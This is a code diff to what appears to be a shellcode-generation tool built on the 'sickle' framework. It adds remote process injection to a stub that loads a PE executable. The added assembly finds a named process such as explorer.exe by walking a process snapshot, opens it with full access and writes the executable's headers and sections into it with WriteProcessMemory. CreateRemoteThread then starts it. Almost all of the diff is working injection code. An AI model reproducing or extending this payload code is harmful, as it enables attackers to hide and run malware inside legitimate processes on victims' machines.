@@ -15,7 +15,8 @@ from sickle.common.headers.windows import (
     winnt,
     ntdef,
     ws2def,
-    winternl
+    tlhelp32,
+    winternl,
 )
 
 class Shellcode():
@@ -62,13 +63,25 @@ class Shellcode():
                                         "thread": "Exit as a thread",
                                         "process": "Exit as a process" }
 
+    advanced["PROCESS"] = {}
+    advanced["PROCESS"]["optional"] = "yes"
+    advanced["PROCESS"]["description"] = "Process name to inject PE into"
+
+    # TODO: Add advanced option to inject into a remote process
+
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
 
         self.dependencies = {
             "Kernel32.dll": [
-                "GetCurrentProcess",
+                "GetCurrentProcess",        # Remove if using process injection
+                "CreateToolhelp32Snapshot", # Make Optional
+                "Process32First",           # Make Optional
+                "Process32Next",            # Make Optional
+                "CloseHandle",              # Make Optional
+                "OpenProcess",              # Make Optional
+                "WriteProcessMemory",       # Make Optional
                 "LoadLibraryA",
                 "VirtualAllocEx",
                 "GetProcAddress",
@@ -116,6 +129,10 @@ class Shellcode():
             "dwSectionMappedSize"           : 0x00,
             "dwSectionProtection"           : 0x00,
             "dwSecIndex"                    : 0x00,
+
+            "ProcessEntry"             : ctypes.sizeof(tlhelp32._PROCESSENTRY32), # get_pid_of()
+            "hSnapshot"                : 0x00, # get_pid_of()
+            "pid"                      : 0x00, # get_pid_of()
         })
 
         self.stack_space = builder.calc_stack_space(sc_args)
@@ -133,6 +150,12 @@ class Shellcode():
         self.exe_stager = extract.read_bytes_from_file(argv_dict["EXE"])
         if self.exe_stager == None:
             exit(-1)
+
+        # If we are injecting into a remote process
+        if "PROCESS" not in argv_dict.keys():
+            self.process = None
+        else:
+            self.process = argv_dict["PROCESS"]
 
         # Change the shellcode operation based on how execution will be performed
         if "OP_AS_FUNC" not in argv_dict.keys():
@@ -179,8 +202,40 @@ get_lpSectionHeaderArray:
 
 init_dwSecIndex:
     xor rax, rax
-    mov [rbp - {self.storage_offsets['dwSecIndex']}], rax
+    mov [rbp - {self.storage_offsets['dwSecIndex']}], rax\n"""
 
+        if self.process != None:
+            stub += f"""
+copy_section:
+    mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]
+    xor r11, r11
+    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
+    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
+    mov r11d, [rdx]
+    xor r14, r14
+    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
+    add rdx, {winnt._IMAGE_SECTION_HEADER.PointerToRawData.offset}
+    mov r14d, [rdx]
+    xor r13, r13
+    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
+    add rdx, {winnt._IMAGE_SECTION_HEADER.SizeOfRawData.offset}
+    mov r13d, [rdx]
+    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
+    add rcx, r11
+    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
+    add rdx, r14
+
+    xchg rcx, r9
+    mov r8, rdx
+    mov rdx, r9
+    mov r9, r13
+    lea r11, [rsp+0x28]
+    mov [rsp+0x20], r11
+    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
+    mov rax, [rbp - {self.storage_offsets['WriteProcessMemory']}]
+    call rax\n"""
+        else:
+            stub += f"""
 copy_section:
     mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]
     xor r11, r11
@@ -201,8 +256,9 @@ copy_section:
     add rdx, r14
     mov r8, r13
     mov rax, [rbp - {self.storage_offsets['memcpy']}]
-    call rax
+    call rax\n"""
 
+        stub += f"""
 get_mapped_section_size:
     xor rax, rax
     mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], rax
@@ -359,7 +415,28 @@ check_next_section:
         """Write the headers into the newly allocated region
         """
 
-        stub = f"""
+        if self.process != None:
+            stub = f"""
+copy_to_alloc:
+    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
+    
+    mov rdx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
+    
+    xor r9, r9
+    mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
+    add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
+    mov r9d, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]
+
+    mov r8, [rbp - {self.storage_offsets['pResponse']}]
+
+    lea r11, [rsp+0x28]
+    mov [rsp+0x20], r11
+
+    mov rax, [rbp - {self.storage_offsets['WriteProcessMemory']}]
+
+    call rax\n"""
+        else:
+            stub = f"""
 copy_to_alloc:
     xor r8, r8
     mov rax, [rbp - {self.storage_offsets['memcpy']}]
@@ -368,8 +445,9 @@ copy_to_alloc:
     add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
     mov r8d, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]
     mov rdx, [rbp - {self.storage_offsets['pResponse']}]
-    call rax
+    call rax\n"""
 
+        stub += f"""
 change_permissions:
     xor rdx, rdx
     mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
@@ -678,16 +756,114 @@ no_reloc:
 
         return stub
 
+    def get_pid_of(self, target_proc):
+        
+        stub = f"""
+; RAX => CreateToolhelp32Snapshot(CreateToolhelp32Snapshot([in] DWORD dwFlags,        // RCX
+;                                                          [in] DWORD th32ProcessID); // RDX
+take_snap:
+    mov rcx, {tlhelp32.TH32CS_SNAPPROCESS}
+    xor rdx, rdx
+    mov rax, [rbp - {self.storage_offsets['CreateToolhelp32Snapshot']}]
+    call rax
+    mov [rbp - {self.storage_offsets['hSnapshot']}], rax
+
+setup_PROCESSENTRY32:
+    lea rbx, [rbp - {self.storage_offsets['ProcessEntry']}]        ; PROCESSENTRY32 ProcessEntry;
+
+    mov rdi, rbx                                                   ; RDI holds the address we're going to zero out (PROCESSENTRY32 structure)
+    xor rax, rax                                                   ; Zero out (RAX == 0x00)
+    mov rcx, {int(ctypes.sizeof(tlhelp32._PROCESSENTRY32)/8)}      ; 0x26 * sizeof(RAX) == sizeof(PROCESSENTRY32)
+    rep stosq                                                      ; "memset(ProcessEntry, 0x00, sizeof(PROCESSENTRY32))"
+
+    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)} ; ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
+
+; if (Process32First(hSnapshot, &ProcessEntry)) {{
+find_proc:
+    mov rcx, [rbp - {self.storage_offsets['hSnapshot']}]
+    lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
+    mov rax, [rbp - {self.storage_offsets['Process32First']}]
+    call rax
+
+check_proc:
+    lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
+    add rdx, {tlhelp32._PROCESSENTRY32.szExeFile.offset}
+    xor rcx, rcx
+
+;     do {{
+;         if (ProcessEntry.szExeFile[0] == 'e' &&
+;             ProcessEntry.szExeFile[1] == 'x' &&
+;             ProcessEntry.szExeFile[2] == 'p' &&
+;             ProcessEntry.szExeFile[3] == 'l' &&
+;             ProcessEntry.szExeFile[4] == 'o' &&
+;             ProcessEntry.szExeFile[5] == 'r' &&
+;             ProcessEntry.szExeFile[6] == 'e' &&
+;             ProcessEntry.szExeFile[7] == 'r') {{
+begin_check:"""
+
+        for i in range(len(target_proc) - 1):
+            stub += f"""
+    mov cl, {hex(ord(target_proc[i]))}
+    cmp [rdx + {i}], cl
+    jne next_proc_entry"""
+
+        stub += f"""
+    cmp byte ptr [rdx + {len(target_proc) - 1}], {hex(ord(target_proc[len(target_proc)-1]))}
+    je get_pid
+
+;     }} while (Process32Next(hSnapshot, &ProcessEntry));
+next_proc_entry:
+    mov rax, [rbp - {self.storage_offsets["Process32Next"]}]
+    mov rcx, [rbp - {self.storage_offsets["hSnapshot"]}]
+    lea rdx, [rbp - {self.storage_offsets["ProcessEntry"]}]
+    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)} ; ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
+    call rax
+    test rax, rax
+    jnz check_proc
+;
+;             pid = ProcessEntry.th32ProcessID;
+;         }}
+get_pid: 
+    xor rax, rax
+    lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
+    add rdx, {tlhelp32._PROCESSENTRY32.th32ProcessID.offset}
+    mov eax, [rdx]
+    mov [rbp - {self.storage_offsets['pid']}], rax
+
+; RAX => CloseHandle([in] HANDLE hObject); // RCX => hSnapshot
+call_CloseHandle:
+    mov rax, [rbp - {self.storage_offsets['CloseHandle']}]
+    mov rcx, [rbp - {self.storage_offsets['hSnapshot']}]
+    call rax
+        """
+
+        return stub
+
     def alloc_image_space(self):
         """Create the allocation where the PE will loaded
         """
 
-        stub = f"""
+        if (self.process != None):
+            stub = self.get_pid_of(self.process)
+            stub += f"""
+; RAX => OpenProcess([in] DWORD dwDesiredAccess, // RCX => 0x001F0FFF
+;                    [in] BOOL  bInheritHandle,  // RDX => FALSE
+;                    [in] DWORD dwProcessId);    // R8  => pid
+call_OpenProcess:
+    mov rax, [rbp - {self.storage_offsets['OpenProcess']}]
+    mov rcx, 0x001F0FFF
+    xor rdx, rdx
+    mov r8, [rbp - {self.storage_offsets['pid']}]
+    call rax
+    mov [rbp - {self.storage_offsets['hProcess']}], rax\n"""
+        else:
+            stub = f"""
 call_GetCurrentProcess:
     mov rax, [rbp - {self.storage_offsets['GetCurrentProcess']}]
     call rax
-    mov [rbp - {self.storage_offsets['hProcess']}], rax
+    mov [rbp - {self.storage_offsets['hProcess']}], rax\n"""
 
+        stub += f"""
 alloc_pe_home:
     mov rcx, [rbp - {self.storage_offsets['hProcess']}]
     xor rdx, rdx
@@ -758,8 +934,10 @@ call_CreateRemoteThread:
     xor r8, r8
     mov rax, [rbp - {self.storage_offsets['CreateRemoteThread']}]
     mov rcx, [rbp - {self.storage_offsets['hProcess']}]
-    call rax
+    call rax\n"""
 
+        if self.process == None:
+            shellcode += f"""
 call_WaitForSingleObject:
     mov rcx, rax
     xor rdx, rdx
@@ -787,8 +965,8 @@ exe_file:
 
         generator = Assembler(Shellcode.arch)
         src = self.generate_source()
-
         shellcode = generator.get_bytes_from_asm(src)
+
         shellcode += self.exe_stager
 
         return shellcode
